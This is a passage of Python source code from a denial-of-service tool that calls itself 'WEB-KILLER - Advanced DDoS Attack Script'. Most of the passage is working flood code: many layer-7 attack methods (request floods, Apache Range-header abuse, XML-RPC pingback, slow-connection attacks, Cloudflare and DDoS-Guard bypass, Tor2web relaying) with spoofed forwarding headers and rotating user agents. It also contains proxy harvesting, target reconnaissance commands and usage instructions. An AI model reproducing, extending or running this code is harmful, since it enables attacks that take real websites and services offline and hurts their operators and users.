                'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
            ]
        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        self._defaultpayload = f"{self._req_type} {target.raw_path_qs} HTTP/{randchoice(['1.0', '1.1', '1.2'])}\r\n"
        self._payload = (
            self._defaultpayload +
            'Accept-Encoding: gzip, deflate, br\r\n'
            'Accept-Language: en-US,en;q=0.9\r\n'
            'Cache-Control: max-age=0\r\n'
            'Connection: keep-alive\r\n'
            'Sec-Fetch-Dest: document\r\n'
            'Sec-Fetch-Mode: navigate\r\n'
            'Sec-Fetch-Site: none\r\n'
            'Sec-Fetch-User: ?1\r\n'
            'Sec-Gpc: 1\r\n'
            'Pragma: no-cache\r\n'
            'Upgrade-Insecure-Requests: 1\r\n'
        )

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value

    def run(self) -> None:
        if self._synevent:
            self._synevent.wait()
        self.select(self._method)
        while self._synevent and self._synevent.is_set():
            self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        return (
            "X-Forwarded-Proto: Http\r\n"
            f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
            f"Via: {spoof}\r\n"
            f"Client-IP: {spoof}\r\n"
            f'X-Forwarded-For: {spoof}\r\n'
            f'Real-IP: {spoof}\r\n'
        )

    def generate_payload(self, other: str = None) -> bytes:
        return str.encode(
            self._payload +
            f"Host: {self._target.authority}\r\n" +
            self.randHeadercontent +
            (other if other else "") +
            "\r\n"
        )

    def open_connection(self, host=None) -> socket:
        if self._proxies:
            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket(AF_INET, SOCK_STREAM)

        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.settimeout(.9)
        sock.connect(host or self._raw_target)

        if self._target.scheme.lower() == "https":
            sock = ctx.wrap_socket(
                sock,
                server_hostname=host[0] if host else self._target.host,
                server_side=False,
                do_handshake_on_connect=True,
                suppress_ragged_eofs=True
            )
        return sock

    @property
    def randHeadercontent(self) -> str:
        return (
            f"User-Agent: {randchoice(self._useragents)}\r\n"
            f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
            self.SpoofIP
        )

    @staticmethod
    def getMethodType(method: str) -> str:
        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
                                            "DYN", "SLOW", "PPS", "APACHE", "BOT", "RHEX", "STOMP"} \
            else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
            else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
            else "REQUESTS"

    def POST(self) -> None:
        payload: bytes = self.generate_payload(
            f"Content-Length: 44\r\n"
            f"X-Requested-With: XMLHttpRequest\r\n"
            f"Content-Type: application/json\r\n\r\n"
            f'{{"data": {ProxyTools.Random.rand_str(32)}}}'
        )[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def TOR(self) -> None:
        provider = "." + randchoice(tor2webs)
        target = self._target.authority.replace(".onion", provider)
        payload: Any = str.encode(
            self._payload +
            f"Host: {target}\r\n" +
            self.randHeadercontent +
            "\r\n"
        )
        s = None
        target_addr = self._target.host.replace(".onion", provider), self._raw_target[1]
        with suppress(Exception), self.open_connection(target_addr) as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STRESS(self) -> None:
        payload: bytes = self.generate_payload(
            f"Content-Length: 524\r\n"
            f"X-Requested-With: XMLHttpRequest\r\n"
            f"Content-Type: application/json\r\n\r\n"
            f'{{"data": {ProxyTools.Random.rand_str(512)}}}'
        )[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def COOKIES(self) -> None:
        payload: bytes = self.generate_payload(
            f"Cookie: _ga=GA{ProxyTools.Random.rand_int(1000, 99999)};"
            f" _gat=1;"
            f" __cfduid=dc232334gwdsd23434542342342342475611928;"
            f" {ProxyTools.Random.rand_str(6)}={ProxyTools.Random.rand_str(32)}\r\n"
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def APACHE(self) -> None:
        payload: bytes = self.generate_payload(
            "Range: bytes=0-,%s" % ",".join(f"5-{i}" for i in range(1, 1024))
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def XMLRPC(self) -> None:
        payload: bytes = self.generate_payload(
            f"Content-Length: 345\r\n"
            f"X-Requested-With: XMLHttpRequest\r\n"
            f"Content-Type: application/xml\r\n\r\n"
            f"<?xml version='1.0' encoding='iso-8859-1'?>"
            f"<methodCall><methodName>pingback.ping</methodName>"
            f"<params><param><value><string>{ProxyTools.Random.rand_str(64)}</string></value></param>"
            f"<param><value><string>{ProxyTools.Random.rand_str(64)}</string></value></param></params></methodCall>"
        )[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def PPS(self) -> None:
        payload: Any = str.encode(
            self._defaultpayload +
            f"Host: {self._target.authority}\r\n\r\n"
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def KILLER(self) -> None:
        while True:
            Thread(target=self.GET, daemon=True).start()

    def GET(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def BOT(self) -> None:
        payload: bytes = self.generate_payload()
        p1 = str.encode(
            f"GET /robots.txt HTTP/1.1\r\n"
            f"Host: {self._target.raw_authority}\r\n"
            f"Connection: Keep-Alive\r\n"
            f"Accept: text/plain,text/html,*/*\r\n"
            f"User-Agent: {randchoice(search_engine_agents)}\r\n"
            f"Accept-Encoding: gzip,deflate,br\r\n\r\n"
        )
        p2 = str.encode(
            f"GET /sitemap.xml HTTP/1.1\r\n"
            f"Host: {self._target.raw_authority}\r\n"
            f"Connection: Keep-Alive\r\n"
            f"Accept: */*\r\n"
            f"From: googlebot(at)googlebot.com\r\n"
            f"User-Agent: {randchoice(search_engine_agents)}\r\n"
            f"Accept-Encoding: gzip,deflate,br\r\n"
            f"If-None-Match: {ProxyTools.Random.rand_str(9)}-{ProxyTools.Random.rand_str(4)}\r\n"
            f"If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n"
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, p1)
            Tools.send(s, p2)
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def EVEN(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            while Tools.send(s, payload) and s.recv(1):
                continue
        Tools.safe_close(s)

    def OVH(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(min(self._rpc, 5)):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def CFB(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), create_scraper() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(), proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue
                with s.get(self._target.human_repr()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def CFBUAM(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, payload)
            sleep(5.01)
            ts = time()
            for _ in range(self._rpc):
                Tools.send(s, payload)
                if time() > ts + 120:
                    break
        Tools.safe_close(s)

    def AVB(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                sleep(max(self._rpc / 1000, 1))
                Tools.send(s, payload)
        Tools.safe_close(s)

    def DGB(self):
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception):
            if self._proxies:
                pro = randchoice(self._proxies)
                ss = Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest())
                if ss:
                    for _ in range(min(self._rpc, 5)):
                        sleep(min(self._rpc, 5) / 100)
                        with ss.get(self._target.human_repr(), proxies=pro.asRequest()) as res:
                            REQUESTS_SENT += 1
                            BYTES_SEND += Tools.sizeOfRequest(res)
                    Tools.safe_close(ss)
            else:
                ss = Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents))
                if ss:
                    for _ in range(min(self._rpc, 5)):
                        sleep(min(self._rpc, 5) / 100)
                        with ss.get(self._target.human_repr()) as res:
                            REQUESTS_SENT += 1
                            BYTES_SEND += Tools.sizeOfRequest(res)
                    Tools.safe_close(ss)

    def DYN(self):
        payload: Any = str.encode(
            self._payload +
            f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n" +
            self.randHeadercontent +
            "\r\n"
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def DOWNLOADER(self):
        payload: Any = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
                while 1:
                    sleep(.01)
                    data = s.recv(1)
                    if not data:
                        break
            Tools.send(s, b'0')
        Tools.safe_close(s)

    def BYPASS(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(), proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue
                with s.get(self._target.human_repr()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def GSB(self):
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                payload = str.encode(
                    f"{self._req_type} {self._target.raw_path_qs}?qs={ProxyTools.Random.rand_str(6)} HTTP/1.1\r\n"
                    f"Host: {self._target.authority}\r\n" +
                    self.randHeadercontent +
                    'Accept-Encoding: gzip, deflate, br\r\n'
                    'Accept-Language: en-US,en;q=0.9\r\n'
                    'Cache-Control: max-age=0\r\n'
                    'Connection: Keep-Alive\r\n'
                    'Sec-Fetch-Dest: document\r\n'
                    'Sec-Fetch-Mode: navigate\r\n'
                    'Sec-Fetch-Site: none\r\n'
                    'Sec-Fetch-User: ?1\r\n'
                    'Sec-Gpc: 1\r\n'
                    'Pragma: no-cache\r\n'
                    'Upgrade-Insecure-Requests: 1\r\n\r\n'
                )
                Tools.send(s, payload)
        Tools.safe_close(s)

    def RHEX(self):
        randhex = str(randbytes(randchoice([32, 64, 128])))
        payload = str.encode(
            f"{self._req_type} {self._target.authority}/{randhex} HTTP/1.1\r\n"
            f"Host: {self._target.authority}/{randhex}\r\n" +
            self.randHeadercontent +
            'Accept-Encoding: gzip, deflate, br\r\n'
            'Accept-Language: en-US,en;q=0.9\r\n'
            'Cache-Control: max-age=0\r\n'
            'Connection: keep-alive\r\n'
            'Sec-Fetch-Dest: document\r\n'
            'Sec-Fetch-Mode: navigate\r\n'
            'Sec-Fetch-Site: none\r\n'
            'Sec-Fetch-User: ?1\r\n'
            'Sec-Gpc: 1\r\n'
            'Pragma: no-cache\r\n'
            'Upgrade-Insecure-Requests: 1\r\n\r\n'
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STOMP(self):
        dep = ('Accept-Encoding: gzip, deflate, br\r\n'
               'Accept-Language: en-US,en;q=0.9\r\n'
               'Cache-Control: max-age=0\r\n'
               'Connection: keep-alive\r\n'
               'Sec-Fetch-Dest: document\r\n'
               'Sec-Fetch-Mode: navigate\r\n'
               'Sec-Fetch-Site: none\r\n'
               'Sec-Fetch-User: ?1\r\n'
               'Sec-Gpc: 1\r\n'
               'Pragma: no-cache\r\n'
               'Upgrade-Insecure-Requests: 1\r\n\r\n')
        hexh = r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87' \
               r'\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F' \
               r'\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F' \
               r'\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84' \
               r'\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F' \
               r'\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98' \
               r'\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98' \
               r'\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B' \
               r'\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99' \
               r'\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C' \
               r'\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
        p1 = str.encode(
            f"{self._req_type} {self._target.authority}/{hexh} HTTP/1.1\r\n"
            f"Host: {self._target.authority}/{hexh}\r\n" +
            self.randHeadercontent + dep
        )
        p2 = str.encode(
            f"{self._req_type} {self._target.authority}/cdn-cgi/l/chk_captcha HTTP/1.1\r\n"
            f"Host: {hexh}\r\n" +
            self.randHeadercontent + dep
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, p1)
            for _ in range(self._rpc):
                Tools.send(s, p2)
        Tools.safe_close(s)

    def NULL(self) -> None:
        payload: Any = str.encode(
            self._payload +
            f"Host: {self._target.authority}\r\n" +
            "User-Agent: null\r\n" +
            "Referrer: null\r\n" +
            self.SpoofIP + "\r\n"
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def BOMB(self):
        assert self._proxies, 'This method requires proxies. Without proxies you can use github.com/codesenberg/bombardier'
        while True:
            proxy = randchoice(self._proxies)
            if proxy.type != ProxyType.SOCKS4:
                break

        bombardier_path = Path.home() / "go/bin/bombardier"
        res = run(
            [
                str(bombardier_path),
                f'--connections={self._rpc}',
                '--http2',
                '--method=GET',
                '--latencies',
                '--timeout=30s',
                f'--requests={self._rpc}',
                f'--proxy={proxy}',
                f'{self._target.human_repr()}',
            ],
            stdout=PIPE,
        )
        if self._thread_id == 0:
            print(proxy, res.stdout.decode(), sep='\n')

    def SLOW(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
            while Tools.send(s, payload) and s.recv(1):
                for i in range(self._rpc):
                    keep = str.encode(f"X-a: {ProxyTools.Random.rand_int(1, 5000)}\r\n")
                    Tools.send(s, keep)
                    sleep(self._rpc / 15)
                    break
        Tools.safe_close(s)


class ProxyManager:

    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        providrs = [
            provider for provider in cf.get("proxy-providers", [])
            if provider["type"] == Proxy_type or Proxy_type == 0
        ]
        logger.info(
            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}{len(providrs)}{bcolors.WARNING} Providers{bcolors.RESET}"
        )
        proxes: Set[Proxy] = set()

        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.download, provider,
                    ProxyType.stringToProxyType(str(provider["type"]))
                )
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
        logger.debug(
            f"{bcolors.WARNING}Proxies from (URL: {bcolors.OKBLUE}{provider['url']}{bcolors.WARNING}, "
            f"Type: {bcolors.OKBLUE}{proxy_type.name}{bcolors.WARNING}, "
            f"Timeout: {bcolors.OKBLUE}{provider['timeout']}{bcolors.WARNING}){bcolors.RESET}"
        )
        proxes: Set[Proxy] = set()
        with suppress(TimeoutError, exceptions.ConnectionError, exceptions.ReadTimeout):
            data = get(provider["url"], timeout=provider["timeout"]).text
            try:
                for proxy in ProxyUtiles.parseAllIPPort(data.splitlines(), proxy_type):
                    proxes.add(proxy)
            except Exception as e:
                logger.error(f'Download Proxy Error: {e}')
        return proxes


class ToolsConsole:
    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def checkRawSocket():
        try:
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        except OSError:
            return False

    @staticmethod
    def runConsole():
        cons = f"{Colors.GREEN}{gethostname()}@WEB-KILLER{Colors.RESET}:{Colors.BLUE}~{Colors.RESET}#"
        print(f"\n{Colors.CYAN}")
        print(f"{Colors.CYAN}   {Colors.WHITE}WEB-KILLER Interactive Console{Colors.CYAN}    ")
        print(f"{Colors.CYAN}{Colors.RESET}\n")

        while True:
            try:
                cmd = input(cons + " ").strip()
                if not cmd:
                    continue
                args = ""
                if " " in cmd:
                    cmd, args = cmd.split(" ", 1)

                cmd = cmd.upper()
                if cmd == "HELP":
                    print(f"\n{Colors.YELLOW}Tools:{Colors.RESET} {', '.join(ToolsConsole.METHODS)}")
                    print(f"{Colors.YELLOW}Commands:{Colors.RESET} HELP, CLEAR, BACK, EXIT\n")
                    continue

                if cmd in {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                    print(f"{Colors.RED}Exiting...{Colors.RESET}")
                    _exit(0)

                if cmd == "CLEAR":
                    os.system('cls' if os.name == 'nt' else 'clear')
                    continue

                if cmd not in ToolsConsole.METHODS:
                    print(f"{Colors.RED}{cmd} command not found{Colors.RESET}")
                    continue

                if cmd == "DSTAT":
                    ToolsConsole._dstat(cons)
                elif cmd in ["CFIP", "DNS"]:
                    print(f"{Colors.YELLOW}Coming Soon{Colors.RESET}")
                elif cmd == "CHECK":
                    ToolsConsole._check(cons)
                elif cmd == "INFO":
                    ToolsConsole._info(cons)
                elif cmd == "TSSRV":
                    ToolsConsole._tssrv(cons)
                elif cmd == "PING":
                    ToolsConsole._ping(cons)

            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Use EXIT to quit{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}Error: {e}{Colors.RESET}")

    @staticmethod
    def _dstat(cons):
        try:
            ld = net_io_counters(pernic=False)
            while True:
                sleep(1)
                od = ld
                ld = net_io_counters(pernic=False)
                t = [(last - now) for now, last in zip(od, ld)]
                logger.info(
                    f"\n{Colors.GREEN}Bytes Sent: {Colors.WHITE}{Tools.humanbytes(t[0])}\n"
                    f"{Colors.GREEN}Bytes Received: {Colors.WHITE}{Tools.humanbytes(t[1])}\n"
                    f"{Colors.GREEN}Packets Sent: {Colors.WHITE}{Tools.humanformat(t[2])}\n"
                    f"{Colors.GREEN}Packets Received: {Colors.WHITE}{Tools.humanformat(t[3])}\n"
                    f"{Colors.GREEN}ErrIn: {Colors.WHITE}{t[4]}\n"
                    f"{Colors.GREEN}ErrOut: {Colors.WHITE}{t[5]}\n"
                    f"{Colors.GREEN}DropIn: {Colors.WHITE}{t[6]}\n"
                    f"{Colors.GREEN}DropOut: {Colors.WHITE}{t[7]}\n"
                    f"{Colors.GREEN}Cpu Usage: {Colors.WHITE}{cpu_percent()}%\n"
                    f"{Colors.GREEN}Memory: {Colors.WHITE}{virtual_memory().percent}%{Colors.RESET}"
                )
        except KeyboardInterrupt:
            pass

    @staticmethod
    def _check(cons):
        while True:
            domain = input(f'{cons}give-me-ipaddress# ')
            if not domain:
                continue
            if domain.upper() == "BACK":
                break
            if domain.upper() == "CLEAR":
                os.system('cls' if os.name == 'nt' else 'clear')
                continue
            if domain.upper() in {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                _exit(0)
            if "/" not in domain:
                continue
            logger.info(f"{Colors.YELLOW}please wait ...{Colors.RESET}")
            try:
                with get(domain, timeout=20) as r:
                    status = "ONLINE" if r.status_code <= 500 else "OFFLINE"
                    color = Colors.GREEN if r.status_code <= 500 else Colors.RED
                    logger.info(
                        f"status_code: {color}{r.status_code}{Colors.RESET}\n"
                        f"status: {color}{status}{Colors.RESET}"
                    )
            except Exception as e:
                logger.error(f"{Colors.RED}Error checking {domain}: {e}{Colors.RESET}")

    @staticmethod
    def _info(cons):
        while True:
            domain = input(f'{cons}give-me-ipaddress# ')
            if not domain:
                continue
            if domain.upper() == "BACK":
                break
            if domain.upper() == "CLEAR":
                os.system('cls' if os.name == 'nt' else 'clear')
                continue
            if domain.upper() in {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                _exit(0)
            domain = domain.replace('https://', '').replace('http://', '')
            if "/" in domain:
                domain = domain.split("/")[0]
            print(f'{Colors.YELLOW}please wait ...{Colors.RESET}', end="\r")

            info = ToolsConsole.info(domain)
            if not info.get("success"):
                print(f"{Colors.RED}Error!{Colors.RESET}")
                continue
            logger.info(
                f"\n{Colors.GREEN}Country: {Colors.WHITE}{info.get('country', 'N/A')}\n"
                f"{Colors.GREEN}City: {Colors.WHITE}{info.get('city', 'N/A')}\n"
                f"{Colors.GREEN}Org: {Colors.WHITE}{info.get('org', 'N/A')}\n"
                f"{Colors.GREEN}Isp: {Colors.WHITE}{info.get('isp', 'N/A')}\n"
                f"{Colors.GREEN}Region: {Colors.WHITE}{info.get('region', 'N/A')}{Colors.RESET}"
            )

    @staticmethod
    def _tssrv(cons):
        while True:
            domain = input(f'{cons}give-me-domain# ')
            if not domain:
                continue
            if domain.upper() == "BACK":
                break
            if domain.upper() == "CLEAR":
                os.system('cls' if os.name == 'nt' else 'clear')
                continue
            if domain.upper() in {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                _exit(0)
            domain = domain.replace('https://', '').replace('http://', '')
            if "/" in domain:
                domain = domain.split("/")[0]
            print(f'{Colors.YELLOW}please wait ...{Colors.RESET}', end="\r")

            info = ToolsConsole.ts_srv(domain)
            logger.info(f"{Colors.GREEN}TCP: {Colors.WHITE}{info.get('_tsdns._tcp.', 'N/A')}\n")
            logger.info(f"{Colors.GREEN}UDP: {Colors.WHITE}{info.get('_ts3._udp.', 'N/A')}{Colors.RESET}\n")

    @staticmethod
    def _ping(cons):
        while True:
            domain = input(f'{cons}give-me-ipaddress# ')
            if not domain:
                continue
            if domain.upper() == "BACK":
                break
            if domain.upper() == "CLEAR":
                os.system('cls' if os.name == 'nt' else 'clear')
            if domain.upper() in {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                _exit(0)

            domain = domain.replace('https://', '').replace('http://', '')
            if "/" in domain:
                domain = domain.split("/")[0]

            logger.info(f"{Colors.YELLOW}please wait ...{Colors.RESET}")
            try:
                r = ping(domain, count=5, interval=0.2)
                status = "ONLINE" if r.is_alive else "OFFLINE"
                color = Colors.GREEN if r.is_alive else Colors.RED
                logger.info(
                    f"Address: {Colors.WHITE}{r.address}{Colors.RESET}\n"
                    f"Ping: {Colors.WHITE}{r.avg_rtt}{Colors.RESET}\n"
                    f"Accepted Packets: {Colors.WHITE}{r.packets_received}/{r.packets_sent}{Colors.RESET}\n"
                    f"status: {color}{status}{Colors.RESET}\n"
                )
            except Exception as e:
                logger.error(f"{Colors.RED}Ping failed: {e}{Colors.RESET}")

    @staticmethod
    def stop():
        print(f'{Colors.RED}All Attacks has been Stopped !{Colors.RESET}')
        for proc in process_iter():
            if proc.name() == "python.exe":
                try:
                    proc.kill()
                except Exception:
                    pass

    @staticmethod
    def usage():
        print_banner()
        print(f'''
{Colors.CYAN}* WEB-KILLER - Advanced DDoS Attack Script With {len(Methods.ALL_METHODS)} Methods{Colors.RESET}
{Colors.YELLOW}Note: If the Proxy list is empty, The attack will run without proxies
      If the Proxy file doesn't exist, the script will download proxies and check them.
      Proxy Type 0 = All in config.json
      SocksTypes:
         - 6 = RANDOM
         - 5 = SOCKS5
         - 4 = SOCKS4
         - 1 = HTTP
         - 0 = ALL
{Colors.CYAN} > Methods:{Colors.RESET}
{Colors.GREEN} - Layer4{Colors.RESET}
 | {', '.join(sorted(Methods.LAYER4_METHODS))} | {len(Methods.LAYER4_METHODS)} Methods
{Colors.GREEN} - Layer7{Colors.RESET}
 | {', '.join(sorted(Methods.LAYER7_METHODS))} | {len(Methods.LAYER7_METHODS)} Methods
{Colors.GREEN} - Tools{Colors.RESET}
 | {', '.join(sorted(ToolsConsole.METHODS))} | {len(ToolsConsole.METHODS)} Methods
{Colors.GREEN} - Others{Colors.RESET}
 | TOOLS, HELP, STOP | 3 Methods
{Colors.CYAN} - Total: {len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS)} Methods{Colors.RESET}

{Colors.WHITE}Example:{Colors.RESET}
   L7: python {argv[0]} <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>
   L4: python {argv[0]} <method> <ip:port> <threads> <duration>
